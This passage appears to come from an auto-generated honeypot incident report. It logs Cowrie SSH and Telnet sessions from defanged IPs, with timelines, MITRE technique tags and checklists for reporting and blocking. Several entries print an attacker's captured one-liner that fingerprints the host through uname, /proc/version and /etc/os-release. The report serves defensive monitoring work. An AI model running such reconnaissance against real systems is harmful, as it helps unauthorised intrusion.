-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:03:12` | `cowrie.session.connect` |
-| `2026-08-22 14:03:12` | `cowrie.client.version` |
-| `2026-08-22 14:03:12` | `cowrie.client.kex` |
-| `2026-08-22 14:03:14` | `cowrie.login.success` |
-| `2026-08-22 14:03:15` | `cowrie.session.params` |
-| `2026-08-22 14:03:15` | `cowrie.command.input` |
-| `2026-08-22 14:03:15` | `cowrie.command.input` |
-| `2026-08-22 14:03:15` | `cowrie.command.input` |
-| `2026-08-22 14:03:15` | `cowrie.command.input` |
-| `2026-08-22 14:03:15` | `cowrie.command.input` |
-| `2026-08-22 14:03:15` | `cowrie.command.success` |
-| `2026-08-22 14:03:15` | `cowrie.command.input` |
-| `2026-08-22 14:03:15` | `cowrie.command.input` |
-| `2026-08-22 14:03:15` | `cowrie.command.input` |
-| `2026-08-22 14:03:15` | `cowrie.command.input` |
-| `2026-08-22 14:03:16` | `cowrie.log.closed` |
-| `2026-08-22 14:03:16` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-c5273cc74c0a
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 14:04 |
-| **Last Seen** | 2026-08-22 14:04 |
-| **Session Duration** | 4s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:04:42` | `cowrie.session.connect` |
-| `2026-08-22 14:04:43` | `cowrie.client.version` |
-| `2026-08-22 14:04:43` | `cowrie.client.kex` |
-| `2026-08-22 14:04:44` | `cowrie.login.success` |
-| `2026-08-22 14:04:46` | `cowrie.session.params` |
-| `2026-08-22 14:04:46` | `cowrie.command.input` |
-| `2026-08-22 14:04:46` | `cowrie.command.input` |
-| `2026-08-22 14:04:46` | `cowrie.command.input` |
-| `2026-08-22 14:04:46` | `cowrie.command.input` |
-| `2026-08-22 14:04:46` | `cowrie.command.input` |
-| `2026-08-22 14:04:46` | `cowrie.command.success` |
-| `2026-08-22 14:04:46` | `cowrie.command.input` |
-| `2026-08-22 14:04:46` | `cowrie.command.input` |
-| `2026-08-22 14:04:46` | `cowrie.command.input` |
-| `2026-08-22 14:04:46` | `cowrie.command.input` |
-| `2026-08-22 14:04:46` | `cowrie.log.closed` |
-| `2026-08-22 14:04:47` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-3d2f987a9d34
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `62.122.195[.]14` |
-| **First Seen** | 2026-08-22 14:04 |
-| **Last Seen** | 2026-08-22 14:04 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:04:46` | `cowrie.session.connect` |
-| `2026-08-22 14:04:47` | `cowrie.client.version` |
-| `2026-08-22 14:04:47` | `cowrie.client.kex` |
-| `2026-08-22 14:04:48` | `cowrie.login.success` |
-| `2026-08-22 14:04:48` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:04:53` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `62.122.195[.]14` to AbuseIPDB if not already reported
-- [ ] Block `62.122.195[.]14` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-a9deba7a944b
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `103.172.11[.]149` |
-| **First Seen** | 2026-08-22 14:04 |
-| **Last Seen** | 2026-08-22 14:05 |
-| **Session Duration** | 7s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:04:53` | `cowrie.session.connect` |
-| `2026-08-22 14:04:54` | `cowrie.client.version` |
-| `2026-08-22 14:04:54` | `cowrie.client.kex` |
-| `2026-08-22 14:04:56` | `cowrie.login.success` |
-| `2026-08-22 14:04:56` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:05:01` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `103.172.11[.]149` to AbuseIPDB if not already reported
-- [ ] Block `103.172.11[.]149` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-d3fced05bb23
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `50.217.255[.]171` |
-| **First Seen** | 2026-08-22 14:06 |
-| **Last Seen** | 2026-08-22 14:06 |
-| **Session Duration** | 8s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:06:09` | `cowrie.session.connect` |
-| `2026-08-22 14:06:11` | `cowrie.client.version` |
-| `2026-08-22 14:06:11` | `cowrie.client.kex` |
-| `2026-08-22 14:06:12` | `cowrie.login.success` |
-| `2026-08-22 14:06:13` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:06:18` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `50.217.255[.]171` to AbuseIPDB if not already reported
-- [ ] Block `50.217.255[.]171` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-d516e893074a
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 14:06 |
-| **Last Seen** | 2026-08-22 14:06 |
-| **Session Duration** | 5s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:06:11` | `cowrie.session.connect` |
-| `2026-08-22 14:06:11` | `cowrie.client.version` |
-| `2026-08-22 14:06:11` | `cowrie.client.kex` |
-| `2026-08-22 14:06:13` | `cowrie.login.success` |
-| `2026-08-22 14:06:15` | `cowrie.session.params` |
-| `2026-08-22 14:06:15` | `cowrie.command.input` |
-| `2026-08-22 14:06:15` | `cowrie.command.input` |
-| `2026-08-22 14:06:15` | `cowrie.command.input` |
-| `2026-08-22 14:06:15` | `cowrie.command.input` |
-| `2026-08-22 14:06:15` | `cowrie.command.input` |
-| `2026-08-22 14:06:15` | `cowrie.command.success` |
-| `2026-08-22 14:06:15` | `cowrie.command.input` |
-| `2026-08-22 14:06:15` | `cowrie.command.input` |
-| `2026-08-22 14:06:15` | `cowrie.command.input` |
-| `2026-08-22 14:06:15` | `cowrie.command.input` |
-| `2026-08-22 14:06:16` | `cowrie.log.closed` |
-| `2026-08-22 14:06:16` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-72c0241c1804
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `60.211.233[.]218` |
-| **First Seen** | 2026-08-22 14:06 |
-| **Last Seen** | 2026-08-22 14:06 |
-| **Session Duration** | 7s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:06:22` | `cowrie.session.connect` |
-| `2026-08-22 14:06:23` | `cowrie.client.version` |
-| `2026-08-22 14:06:23` | `cowrie.client.kex` |
-| `2026-08-22 14:06:25` | `cowrie.login.success` |
-| `2026-08-22 14:06:25` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:06:30` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `60.211.233[.]218` to AbuseIPDB if not already reported
-- [ ] Block `60.211.233[.]218` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-1e28095700c5
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `83.255.102[.]217` |
-| **First Seen** | 2026-08-22 14:06 |
-| **Last Seen** | 2026-08-22 14:06 |
-| **Session Duration** | 5s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:06:35` | `cowrie.session.connect` |
-| `2026-08-22 14:06:35` | `cowrie.client.version` |
-| `2026-08-22 14:06:35` | `cowrie.client.kex` |
-| `2026-08-22 14:06:36` | `cowrie.login.success` |
-| `2026-08-22 14:06:36` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:06:41` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `83.255.102[.]217` to AbuseIPDB if not already reported
-- [ ] Block `83.255.102[.]217` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-3b59dd6c538c
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:09` | `cowrie.session.connect` |
-| `2026-08-22 14:07:10` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:11` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:11` | `cowrie.login.success` |
-| `2026-08-22 14:07:11` | `cowrie.session.params` |
-| `2026-08-22 14:07:11` | `cowrie.log.closed` |
-| `2026-08-22 14:07:11` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-0be0600a46ff
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:11` | `cowrie.session.connect` |
-| `2026-08-22 14:07:12` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:13` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:13` | `cowrie.login.success` |
-| `2026-08-22 14:07:13` | `cowrie.session.params` |
-| `2026-08-22 14:07:13` | `cowrie.log.closed` |
-| `2026-08-22 14:07:13` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-9770aa2fd3c8
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:13` | `cowrie.session.connect` |
-| `2026-08-22 14:07:14` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:15` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:15` | `cowrie.login.success` |
-| `2026-08-22 14:07:15` | `cowrie.session.params` |
-| `2026-08-22 14:07:15` | `cowrie.log.closed` |
-| `2026-08-22 14:07:15` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-a832c963a2a3
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:15` | `cowrie.session.connect` |
-| `2026-08-22 14:07:16` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:16` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:16` | `cowrie.login.success` |
-| `2026-08-22 14:07:17` | `cowrie.session.params` |
-| `2026-08-22 14:07:17` | `cowrie.log.closed` |
-| `2026-08-22 14:07:17` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-26545a5f5ccd
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:17` | `cowrie.session.connect` |
-| `2026-08-22 14:07:18` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:18` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:18` | `cowrie.login.success` |
-| `2026-08-22 14:07:19` | `cowrie.session.params` |
-| `2026-08-22 14:07:19` | `cowrie.log.closed` |
-| `2026-08-22 14:07:19` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-37803995b0e8
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:19` | `cowrie.session.connect` |
-| `2026-08-22 14:07:20` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:20` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:20` | `cowrie.login.success` |
-| `2026-08-22 14:07:21` | `cowrie.session.params` |
-| `2026-08-22 14:07:21` | `cowrie.log.closed` |
-| `2026-08-22 14:07:21` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-4a0334112191
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:21` | `cowrie.session.connect` |
-| `2026-08-22 14:07:21` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:22` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:22` | `cowrie.login.success` |
-| `2026-08-22 14:07:23` | `cowrie.session.params` |
-| `2026-08-22 14:07:23` | `cowrie.log.closed` |
-| `2026-08-22 14:07:23` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-d00a1fd85bf7
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:23` | `cowrie.session.connect` |
-| `2026-08-22 14:07:23` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:24` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:24` | `cowrie.login.success` |
-| `2026-08-22 14:07:24` | `cowrie.session.params` |
-| `2026-08-22 14:07:24` | `cowrie.log.closed` |
-| `2026-08-22 14:07:25` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-8b58c276f5b0
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:25` | `cowrie.session.connect` |
-| `2026-08-22 14:07:25` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:26` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:26` | `cowrie.login.success` |
-| `2026-08-22 14:07:26` | `cowrie.session.params` |
-| `2026-08-22 14:07:26` | `cowrie.log.closed` |
-| `2026-08-22 14:07:27` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-2f9cb54eed47
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:27` | `cowrie.session.connect` |
-| `2026-08-22 14:07:27` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:28` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:28` | `cowrie.login.success` |
-| `2026-08-22 14:07:28` | `cowrie.session.params` |
-| `2026-08-22 14:07:28` | `cowrie.log.closed` |
-| `2026-08-22 14:07:28` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-6f1a6564f251
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:28` | `cowrie.session.connect` |
-| `2026-08-22 14:07:29` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:30` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:30` | `cowrie.login.success` |
-| `2026-08-22 14:07:30` | `cowrie.session.params` |
-| `2026-08-22 14:07:30` | `cowrie.log.closed` |
-| `2026-08-22 14:07:30` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-5387d3ecef22
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:30` | `cowrie.session.connect` |
-| `2026-08-22 14:07:31` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:32` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:32` | `cowrie.login.success` |
-| `2026-08-22 14:07:32` | `cowrie.session.params` |
-| `2026-08-22 14:07:32` | `cowrie.log.closed` |
-| `2026-08-22 14:07:32` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-f84ab416a9e5
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:32` | `cowrie.session.connect` |
-| `2026-08-22 14:07:33` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:33` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:33` | `cowrie.login.success` |
-| `2026-08-22 14:07:34` | `cowrie.session.params` |
-| `2026-08-22 14:07:34` | `cowrie.log.closed` |
-| `2026-08-22 14:07:34` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-98a5ff62881e
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:34` | `cowrie.session.connect` |
-| `2026-08-22 14:07:35` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:35` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:35` | `cowrie.login.success` |
-| `2026-08-22 14:07:36` | `cowrie.session.params` |
-| `2026-08-22 14:07:36` | `cowrie.log.closed` |
-| `2026-08-22 14:07:36` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-afed4fd98079
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:36` | `cowrie.session.connect` |
-| `2026-08-22 14:07:37` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:37` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:37` | `cowrie.login.success` |
-| `2026-08-22 14:07:38` | `cowrie.session.params` |
-| `2026-08-22 14:07:38` | `cowrie.log.closed` |
-| `2026-08-22 14:07:38` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-cdce7030b2a0
-
-| Field | Detail |
